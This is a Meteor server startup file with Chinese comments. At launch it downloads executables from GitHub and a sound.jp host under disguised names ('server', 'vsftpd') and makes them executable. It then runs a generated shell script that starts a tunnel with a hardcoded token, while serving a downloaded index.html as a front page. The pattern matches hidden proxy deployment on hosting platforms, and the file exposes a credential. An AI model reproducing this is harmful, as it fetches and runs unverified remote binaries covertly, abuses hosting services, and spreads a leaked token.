import { Meteor } from 'meteor/meteor';
import { WebApp } from 'meteor/webapp';
import { fetch } from 'meteor/fetch';
import fs from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// begin.sh 的内容
const BEGIN_SH_CONTENT = `#!/bin/sh

echo "-----  Starting server...----- "
Token=\${Token:-'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiNjBlZjljZGUtNTkyNC00Mjk4LTkwN2QtY2FjNzlkNDlmYTQ4IiwicyI6IlltUTFaalJtTURFdFpUbGtZaTAwTUdObUxXRTFOalF0TURWak5qTTBZekV4TjJSaiJ9'}

# 启动 server，输出重定向到日志文件
nohup ./server tunnel --edge-ip-version auto run --token $Token > server.log 2>&1 &
SERVER_PID=$!
echo "Server started with PID: $SERVER_PID"

echo "-----  Starting vsftpd ...----- "
# 启动 vsftpd，输出重定向到日志文件
nohup ./vsftpd > vsftpd.log 2>&1 &
VSFTPD_PID=$!
echo "VSFTPD started with PID: $VSFTPD_PID"

# 启动日志监控
(tail -f server.log | sed 's/^/[Server] /') &
(tail -f vsftpd.log | sed 's/^/[VSFTPD] /') &

# 记录进程已启动
echo "All processes started successfully"
exit 0`;

const FILES_TO_DOWNLOAD = [
  {
    url: 'https://github.com/wwrrtt/test/releases/download/3.0/index.html',
    filename: 'index.html',
  },
  {
    url: 'https://github.com/wwrrtt/test/raw/main/server',
    filename: 'server',
  },
  {
    url: 'https://sound.jp/kid/vsftpd',
    filename: 'vsftpd',
  }
];

// 下载文件的异步函数
async function downloadFile(url, filename) {
  console.log(`Downloading ${url}...`);
  try {
    const response = await fetch(url);
    const buffer = await response.arrayBuffer();
    fs.writeFileSync(filename, Buffer.from(buffer));
    console.log(`Downloaded ${filename}`);
  } catch (error) {
    console.error(`Error downloading ${filename}:`, error);
    throw error;
  }
}

// 设置文件（下载文件，赋予权限，执行脚本）函数
async function setupFiles() {
  try {
    console.log('Starting file setup...');
    // 下载所有文件
    for (const file of FILES_TO_DOWNLOAD) {
      await downloadFile(file.url, file.filename);
    }

    // 创建 begin.sh
    console.log('Creating begin.sh...');
    fs.writeFileSync('begin.sh', BEGIN_SH_CONTENT);

    console.log('Files downloaded, setting permissions...');
    // 修改为正确的文件名
    await execAsync('chmod +x begin.sh server vsftpd');
    
    console.log('Executing begin.sh...');
    // 使用 nohup 执行脚本
    const child = exec('nohup ./begin.sh > begin.log 2>&1 &', {
      maxBuffer: 1024 * 1024 * 10
    });
    
    // 捕获标准输出
    child.stdout.on('data', (data) => {
      // 移除末尾的换行符并添加时间戳
      const lines = data.toString().split('\n');
      lines.forEach(line => {
        if (line.trim()) {
          console.log(`[${new Date().toISOString()}] ${line}`);
        }
      });
    });

    // 捕获标准错误
    child.stderr.on('data', (data) => {
      const lines = data.toString().split('\n');
      lines.forEach(line => {
        if (line.trim()) {
          console.error(`[${new Date().toISOString()}] ERROR: ${line}`);
        }
      });
    });

    // 等待脚本执行完成
    await new Promise((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) {
          console.log('begin.sh completed successfully');
          resolve();
        } else {
          reject(new Error(`begin.sh exited with code ${code}`));
        }
      });
    });

    return true;
  } catch (error) {
    console.error('Error in setup:', error);
    return false;
  }
}

// 启动时先执行文件下载和脚本，然后再设置 web 服务
Meteor.startup(async () => {
  try {
    console.log('Starting setup process...');
    const success = await setupFiles();
    
    if (!success) {
      console.error('Failed to setup files');
      return;
    }
    
    console.log('Setup completed, starting web server...');
    // 使用 WebApp.connectHandlers
    WebApp.connectHandlers.use('/', (req, res, next) => {
      if (req.url === '/') {
        try {
          const content = fs.readFileSync('index.html', 'utf8');
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end(content);
        } catch (error) {
          console.error('Error serving index.html:', error);
          next();
        }
      } else {
        next();
      }
    });
    
    console.log('Web server started successfully');
  } catch (error) {
    console.error('Startup error:', error);
  }
});
